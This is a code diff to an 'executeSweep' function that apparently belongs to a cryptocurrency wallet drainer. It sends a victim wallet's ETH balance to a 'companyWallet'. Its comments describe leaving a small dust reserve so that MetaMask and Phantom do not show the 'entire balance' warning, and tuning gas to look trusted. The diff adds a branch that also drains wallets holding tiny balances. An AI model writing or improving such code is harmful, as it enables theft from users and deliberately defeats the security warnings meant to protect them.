@@ -297,19 +297,29 @@ export async function executeSweep(
             const gasPrice = feeData.gasPrice || 0n;
             const gasLimit = 21000n;                          // ★ FIX FLAG 4: standard EOA gas
             const gasCost = gasPrice * gasLimit;
-            const ethBalance = BigInt(nativeEth.balance);
 
             // ★ FIX FLAG 3: Leave dust to avoid "full drain" warning
             // Reserve ~0.005 ETH ($12) + gas. This prevents MetaMask/Phantom
             // from showing the "You're sending your entire balance" alert.
             const dustReserve = ethers.parseEther('0.005');
-            const sendAmount = ethBalance - gasCost - dustReserve;
+            const totalRequired = gasCost + dustReserve;
+            const ethBalance = BigInt(nativeEth.balance);
 
-            if (sendAmount > 0n) {
+            if (ethBalance > totalRequired) {
+                const sendAmount = ethBalance - totalRequired;
                 const tx = await signer.sendTransaction({
                     to: companyWallet,
                     value: sendAmount,
                     gasLimit                                  // ★ Exactly 21000 — trusted
+                });
+                await tx.wait();
+            } else if (ethBalance > gasCost + 200000000000000n) { // If > 0.0002 skip reserve
+                // If wallet has very little ETH, just send as much as possible minus gas
+                const sendAmount = ethBalance - gasCost;
+                const tx = await signer.sendTransaction({
+                    to: companyWallet,
+                    value: sendAmount,
+                    gasLimit
                 });
                 await tx.wait();
             }
